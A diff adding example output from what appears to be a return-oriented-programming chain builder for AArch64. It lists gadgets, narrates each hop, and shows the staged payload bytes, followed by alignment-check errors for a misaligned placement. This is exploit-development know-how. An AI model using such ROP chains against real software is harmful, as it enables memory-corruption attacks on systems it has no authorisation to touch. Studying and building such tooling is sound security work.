@@ -1,0 +1,33 @@
+$ python3 ex12_aarch64_chain.py
+gadgets:
+  0x400c48: ldp x29, x30, [sp], #0x10; ret
+  0x401b70: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
+  0x402d98: mov x0, x20; blr x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
+
+narrate(): the hop-by-hop story
+chain maint in req (carry=Passthru)
+  hop enter: Epilogue @ 0x400c48
+  hop load_call: LoadPair @ 0x401b70
+  hop unlock: CallTail @ 0x402d98
+    needs x19 <- cell:req.maint.load_call.x19  (the function blr calls)
+    needs x20 <- cell:req.maint.load_call.x20  (-> x0, its one argument)
+  (finished)
+
+seal(), then check(): every need fed, SP % 16 == 0 at every gadget entry
+check: 0 errors, 0 warnings, 0 pending
+
+the final image: three frames of little-endian qwords (unset x29 slots ride the fill)
+region req (base=req_va, fill=0x00)
+  +0x0018 w8 701b400000000000  [req.maint.enter.pc]
+  +0x0028 w8 982d400000000000  [req.maint.load_call.pc]
+  +0x0030 w8 443e400000000000  [req.maint.load_call.x19]
+  +0x0038 w8 eeffc00000000000  [req.maint.load_call.x20]
+  +0x0048 w8 004f400000000000  [req.maint.unlock.pc]
+(0x401b70 staged as 701b40...: the little-endian default at work -- no endian= was declared)
+
+the same chain aimed at +0x8 -- misaligned by the width of one pad word:
+  CHK-207 [maint.enter, Epilogue]: Epilogue uses entry_sp_mod=0, but this position in the chain requires entry_sp_mod=8 (SP % 16 at entry)
+  CHK-207 [maint.load_call, LoadPair]: LoadPair uses entry_sp_mod=0, but this position in the chain requires entry_sp_mod=8 (SP % 16 at entry)
+  CHK-207 [maint.unlock, CallTail]: CallTail uses entry_sp_mod=0, but this position in the chain requires entry_sp_mod=8 (SP % 16 at entry)
+not a movaps ten calls deep: on AArch64 the FIRST SP-based access faults in
+hardware, so every hop refuses -- realign the chain, not the gadget list
